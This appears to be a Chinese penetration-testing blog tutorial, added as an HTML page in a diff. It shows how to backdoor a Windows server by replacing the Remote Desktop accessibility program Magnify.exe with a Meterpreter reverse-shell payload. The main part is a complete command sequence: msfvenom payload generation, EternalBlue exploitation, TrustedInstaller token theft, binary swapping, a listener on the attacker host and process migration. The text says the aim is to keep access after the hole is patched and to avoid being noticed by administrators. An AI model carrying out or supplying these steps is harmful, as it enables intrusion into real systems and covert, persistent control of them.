@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<!--Copyright©QingSword.COM︻☼1010D>-->
+<!--Copyright©X.QingSword.COM︻☼1010D>-->
+<html lang="zh-cn">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+	<meta name="keywords" content="晴刃,晴,qing,qingsword,ccna图文笔记,ubuntu,linux,ubuntu server,mysql,python,计算机技术博客,渗透测试,kali渗透测试,kali,kali web渗透,kali主机渗透,kali无线渗透,metasploit,白帽子测试">
+	<meta name="keywords" content="晴刃,晴,qing,qingsword,ccna图文笔记,ubuntu,linux,ubuntu server,mysql,node.js,javascript,python,计算机技术博客">
+	<meta name="author" content="x.qingsword.com">
+	<title>[Metasploit]-9-利用Windows远程桌面功实现Payload后门 - X.QingSword.COM</title>
+	<link rel="shortcut icon" type="image/x-icon" href="../logo/favicon.ico">
+	<link rel="stylesheet" type="text/css" href="../css/basic.css">
+	<link rel="stylesheet" type="text/css" href="../css/text.css">
+	<!-- 代码块高亮js -->
+	<link type="text/css" rel="stylesheet" href="../plugins/SyntaxHighlighter/styles/shCore.css"/>
+	<link type="text/css" rel="stylesheet" href="../plugins/SyntaxHighlighter/styles/shThemeRDark.css"/>
+	<script type="text/javascript" src="../plugins/SyntaxHighlighter/scripts/shCore.js"></script>
+	<script type="text/javascript" src="../plugins/SyntaxHighlighter/scripts/shBrushBash.js"></script>
+	<script type="text/javascript">
+	SyntaxHighlighter.all();
+	</script>
+</head>
+<body>
+	<!--header -->
+	<header id="nav">
+			<div class="nav-container"> 
+				<!-- 根大纲-->
+				<a href="http://x.qingsword.com" title="晴刃">
+					<h1 class="nav-logo">晴刃</h1>
+				</a>
+				<h2 class="nav-site-description desc-hidden">
+					He lies somewhere here
+				</h2>
+				<nav class="nav-links"> 
+					<!-- nav连接大纲-->
+					<h1 style="display:none;">网站导航</h1> 
+					<ul>
+						<li  class="active li-hidden">
+							<a href="../index.html" title="home">
+								<span class="link-word"><img src="../logo/home.png" alt="home" class="link-img">首页</span>
+							</a>
+						</li>
+						<li class="li-hidden">
+							<a href="../pt.html" title="pt">
+								<span class="link-word"><img src="../logo/linux.png" alt="pt" class="link-img">渗透<span class="word-hidden">技术</span></span>
+							</a>
+						</li>
+						<li >
+							<a href="../sitemap.html" title="sitemap">
+								<span class="link-word"><img src="../logo/archives.png" alt="archives" class="link-img"><span class="word-hidden">文章</span>归档</span>
+							</a>
+						</li>
+					</ul>
+				</nav>
+			</div>		
+	</header>
+	<!-- /header -->
+
+	<!-- content-->
+	<div id="content">
+		<div class="content-container">
+			<!-- 文章区 -->
+			<article class="text-container">
+				<header class="text-header">
+					<h1>[Metasploit]-9-利用Windows远程桌面功实现Payload后门</h1>	
+				</header><!-- /header -->
+				<section class="text-body">
+					<h2>引言</h2>
+					<p>在Windows远程桌面界面中，集成了一些系统辅助功能，这些功能包含"屏幕键盘"、"放大镜"、"讲述人"等，微软将这些功能集成在登录界面里面本来是为了方便使用者，而这些程序无需用户登录就能执行，这样的设计就会让一些程序有机可乘，只要替换了其中某一个程序，就能绕过登录，直接启动替换后的程序。</p>
+					<!-- 目录 -->
+					<h2>文章目录</h2>
+					<ul class="contents">	
+						 <li><a href="#Metasploit-Remote-desktop-Backdoor-1">0×1.Windows远程桌面功能简介</a></li>
+						 <li><a href="#Metasploit-Remote-desktop-Backdoor-2">0×2.如何替换Windows远程桌面功实现Payload后门</a></li>
+					 </ul>
+					<!-- /目录 -->
+
+					<!-- 正文 -->
+					
+					<h2 id="Metasploit-Remote-desktop-Backdoor-1">0×1.Windows远程桌面功能简介</h2>
+
+					<p>首先来看一下远程桌面提供的这些功能，请看下面的截图：</p>
+					<img src="images/Metasploit-Remote-desktop-Backdoor-1.jpg" alt="images/Metasploit-Remote-desktop-Backdoor-1.jpg">
+					<p>其中每一个功能，都是保存在"C:\Windows\System32"目录中的一个应用程序，比如上图中的"轻松访问"这个程序窗口，在System32目录中程序名叫"Utilman.exe"；屏幕键盘程序名称是"osk.exe"；放大镜的程序名称是"Magnify.exe"；讲述人程序名称为"Narrator.exe"；高对比度、粘滞键、筛选键都使用了程序"sethc.exe"提供的功能。</p>
+					<p>我们知道这些程序能够在登录前被启动，也知道这些程序的位置以及名称，那么如果将其中的某个程序替换成上一篇文章中讲解的Payload ShellCode，启动这个替换后的程序，就会执行Payload，远程连接Payload中指定的IP地址，从而让攻击者得到一个ShellCode。</p>
+					<p>唯一需要注意的是，所有"轻松访问"里能够调用的这些程序的父进程都是"Utilman.exe"，而"Utilman.exe"的父进程又是"远程桌面"这个服务进程，所以，只要父进程被关闭，子进程也会随即结束，当使用这种方法得到一个ShellCode后，为了保持连接稳定性，要么将这个ShellCode的进程迁移到其他进程，要么直接给系统添加一个隐藏账号，使用这个账号的图形界面登录系统，操作完成退出时再删除这个账号，具体请看本文第二部分的实例。</p>
+
+					<h2 id="Metasploit-Remote-desktop-Backdoor-2">0×2.如何替换Windows远程桌面功实现Payload后门</h2>
+					
+					<p>当我们使用漏洞成功得到一台Windows服务器的控制权后，为了防止漏洞被修补，往往会留下一些后门程序，但常驻进程的后门程序太过占用系统资源，而且很容易被管理员发现，这个时候，我们可以使用本文的方法，替换远程桌面功能，实现一个手动触发的Payload后门。</p>
+
+					<p>实验环境如下：</p>
+					<p class="indent-p">
+						×攻击主机 Kali 192.168.80.158 <br>
+						×目标靶机 Windows2008 x64 192.168.80.139
+					</p>
+
+					<pre class="brush: bash;">
+					#首先在Kali上，生成一个Payload可执行文件，这个Payload一旦执行，就会主动连接192.168.80.158的9988端口，返回一个Meterpreter ShellCode
+					root@kingsword:~# msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.80.158 lport=9988 -e x64/xor -i 4 -f exe -o /root/qingsword.exe -b '\x00'
+
+					#然后启动msf控制台，使用"永恒之蓝"漏洞进入Win2008
+					root@qingsword.com:~# msfdb run
+					msf &gt; use exploit/windows/smb/ms17_010_eternalblue
+					msf exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp
+					payload =&gt; windows/x64/meterpreter/reverse_tcp
+					msf exploit(windows/smb/ms17_010_eternalblue) &gt; set rhost 192.168.80.139
+					rhost =&gt; 192.168.80.139
+					msf exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 192.168.80.158
+					lhost =&gt; 192.168.80.158
+					msf exploit(windows/smb/ms17_010_eternalblue) &gt; set lport 9876
+					lport =&gt; 9876
+					msf exploit(windows/smb/ms17_010_eternalblue) &gt; exploit 
+
+					#等待服务器加载Payload后，我们首先需要获得系统TrustedInstaller权限，方便修改替换文件
+
+					#进入系统shell，启动TrustedInstall服务，然后窃取TrustedInstaller.exe进程的Token
+					meterpreter &gt; shell
+
+					#启动服务
+					C:\Windows\system32&gt;sc start trustedinstaller
+					C:\Windows\system32&gt;exit
+
+					#查看TrustedInstaller.exe进程PID
+					meterpreter &gt; ps
+					2408  496  TrustedInstaller.exe  x64  0  NT AUTHORITY\SYSTEM
+
+					#窃取TrustedInstaller.exe进程Token，这样当前meterpreter就具有了TrustedInstaller权限
+					meterpreter &gt; steal_token 2408
+
+					#现在将我们生成的qingsword.exe上传到目标系统目录中（注意，在meterpreter中，win目录都需要使用双斜杠）
+					meterpreter &gt; upload qingsword.exe C:\\windows\\system32
+
+					#进入系统shell，将Magnify.exe（放大镜）程序替换成我们的Payload
+					meterpreter > shell
+
+					#将原文件备份一下
+					C:\Windows\system32&gt;move Magnify.exe Magnify.bk
+					move Magnify.exe Magnify.bk
+					移动了         1 个文件。
+
+					#将qingsword.exe改名为Magnify.exe
+					C:\Windows\system32&gt;move qingsword.exe Magnify.exe
+					move qingsword.exe Magnify.exe
+
+					#现在我们可以退出这个shell，断开当前使用"永恒之蓝"获取到的Meterpreter ShellCode
+					C:\Windows\system32&gt;exit
+					meterpreter > exit
+
+					#这样我们就将Payload后门藏在了靶机远程桌面的放大镜程序调用那里，如果想重新连接服务器，就算它"永恒之蓝"这个漏洞已经被修补也没有关系
+
+					#如果现在想打开后门连接上服务器，先加载空Exploit，然后设置一个和上面生成Payload后门应用一样的Payload
+					msf &gt; use exploit/multi/handler 
+					msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+					payload =&gt; windows/x64/meterpreter/reverse_tcp
+					msf exploit(multi/handler) &gt; set lport 9988
+					lport =&gt; 9988
+					msf exploit(multi/handler) &gt; set lhost 192.168.80.158
+					lhost =&gt; 192.168.80.158
+					msf exploit(multi/handler) &gt; exploit 
+
+					[*] Started reverse TCP handler on 192.168.80.158:9988 
+
+					#现在打开靶机的远程桌面，启动放大镜程序，看看是不是返回了一个Meterpreter Shellcode，但这个连接不会持续太长时间，远程桌面登录会有一个超时时间，所以要尽快将进程迁移到其他进程中
+
+					#显示当前进程列表
+					meterpreter > ps
+					752   2168  explorer.exe  x64  1  WIN-9PV48KN2GGU\Administrator
+
+					#将meterpreter进程迁移到explorer.exe进程中
+					meterpreter > migrate 752
+					[*] Migrating from 2976 to 752...
+					</pre>
+					
+					<p>文章配套小视频[<a title="qingsword制作kali安装VMware Tools小视频" href="https://pan.baidu.com/s/1maf0_KNjFY6atCifqpesVw" target="_blank" rel="nofollow">点击这里</a>][提取码 k7ht]，下载观看</p>
+
+					<!-- /正文 -->
+
+
+				<footer class="text-footer">
+					<p>
+						*转载请注明来自:<a title="晴刃-自由、互助、分享、专注计算机技术。" href="http://x.qingsword.com" target="_blank">晴刃(X.QingSword.COM)</a>
+					</p>
+					<p>*原文连接:<a title="[Metasploit]-9-利用Windows远程桌面功实现Payload后门" href="https://x.qingsword.com/qing/Metasploit-9.html" target="_blank">https://x.qingsword.com/qing/Metasploit-9.html</a></p>
+				</footer>
+			</article>
+			<!-- /文章区 -->	
+		</div>
+	</div>
+	<!-- /content -->
+	
+	<!-- footer -->
+	<footer id="footer">
+		<div class="footer-container">
+			QingSword.COM &nbsp;<img src="../logo/by-nc-sa.png" alt="Creative Commons" title="Creative Commons">
+		</div>
+	</footer>
+	<!-- /footer -->
+</body>
+</html>
